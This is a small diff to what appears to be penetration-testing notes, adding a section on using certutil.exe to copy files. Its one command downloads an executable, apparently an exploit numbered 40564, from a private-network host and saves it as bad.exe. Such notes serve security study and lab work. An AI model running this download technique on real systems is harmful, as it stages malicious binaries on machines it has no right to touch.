@@ -695,8 +695,13 @@ Management Users can access it with WinRM.
 ![image](https://github.com/user-attachments/assets/b84b14f0-afde-4068-9c41-4aad6dbf3aa5)
 
 
+--------------
 
+### Using `certutil.exe` to copy files
 
+`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
+
+--------------
 
 
 
